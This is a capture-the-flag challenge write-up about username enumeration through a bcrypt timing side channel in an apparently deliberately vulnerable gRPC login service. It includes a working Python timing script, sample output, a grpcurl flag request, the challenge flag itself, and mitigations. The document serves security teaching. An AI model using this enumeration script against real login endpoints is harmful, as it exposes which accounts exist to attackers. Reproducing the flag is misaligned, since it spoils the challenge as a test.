# Challenge 11 — Timing Attack (Username Enumeration)

| Difficulty | Category          | Service        |
|:----------:|-------------------|----------------|
| 🔴  Hard   | Info Disclosure   | AuthService    |

**Flag:** `FLAG{t1m1ng_4tt4ck_us3r_3num3r4t10n}`

---

## Real-world motivation

Side-channel attacks against login endpoints are one of the most
persistent classes of web vulnerabilities:

- **OWASP Testing Guide — WSTG-IDNT-04**: *Testing for Account Enumeration
  and Guessable User Account*.
- **CWE-208**: *Observable Timing Discrepancy*.
- Real incidents: GitHub's old `POST /login` endpoint leaked usernames via
  response-time differences (reported 2016, fixed the same year).
- More recently, multiple *SaaS gRPC APIs* have shipped with the same
  bug because developers assume gRPC "fixes" auth issues for free.

---

## Objective

Enumerate which usernames exist on the server *without* having any valid
credentials.  Then, chain that information with the `GetFlag` RPC to
retrieve the timing-attack flag.

---

## Why it works

`AuthService.Login`:

```python
cursor.execute("SELECT ... FROM users WHERE username = ?", (u,))
user = cursor.fetchone()
if user is None or not bcrypt.checkpw(pw, user.password):
    return FAIL
```

- **Missing user** → `cursor.fetchone()` returns `None` → **no bcrypt call**.
- **Existing user** → bcrypt runs against the stored hash (~60–80 ms with
  default `gensalt()`).

The response delta between the two branches is easily ≥ 50 ms — measurable
with a tiny sample size.

---

## Exploit

```bash
python client/exploits/exploit_11_timing_attack.py
```

Or manually:

```python
import time, statistics, grpc
from generated import auth_pb2, auth_pb2_grpc

def avg_ms(username, n=10):
    stub = auth_pb2_grpc.AuthServiceStub(grpc.insecure_channel("localhost:50051"))
    samples = []
    for _ in range(n):
        t0 = time.perf_counter()
        try:
            stub.Login(auth_pb2.LoginRequest(username=username, password="x" * 16))
        except grpc.RpcError:
            pass
        samples.append((time.perf_counter() - t0) * 1000)
    return statistics.median(samples)

candidates = ["admin", "alice", "bob", "charlie", "dave", "eve", "ghost"]
for name in candidates:
    print(f"{name:10s} median={avg_ms(name):.2f} ms")
```

A typical output:

```
admin      median=82.10 ms      ← exists
alice      median=79.44 ms      ← exists
bob        median=78.97 ms      ← exists
eve        median= 1.32 ms      ← missing
ghost      median= 1.12 ms      ← missing
```

Once you have the list of real accounts, request the flag:

```bash
grpcurl -plaintext -d '{"challenge":"timing_attack"}' \
  localhost:50051 dvgrpc.AdminService/GetFlag
```

---

## Root cause

Two different work profiles for the two branches of the login check.

---

## Mitigation (production)

1. Always perform a **dummy bcrypt comparison** when the user doesn't
   exist — use `bcrypt.checkpw(pw, DUMMY_HASH)` so the expensive work is
   done regardless.
2. Return identical error messages for both "user not found" and "bad
   password".
3. Add jitter to response times (**defense in depth only** — not a
   substitute for fix #1).
4. Monitor for enumeration via rate-limiting + anomaly detection.

A safer `Login` skeleton:

```python
DUMMY_HASH = bcrypt.hashpw(b"dummy", bcrypt.gensalt())

def Login(self, req, ctx):
    user = db.get_user(req.username)
    hashed = user.password if user else DUMMY_HASH
    if user is None or not bcrypt.checkpw(req.password.encode(), hashed):
        return LoginResponse(success=False, message="Invalid credentials")
    ...
```

---

## References

- OWASP WSTG — [Testing for Account Enumeration](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account)
- [A Lesson in Timing Attacks — Coda Hale](https://codahale.com/a-lesson-in-timing-attacks/)
- [CWE-208](https://cwe.mitre.org/data/definitions/208.html)
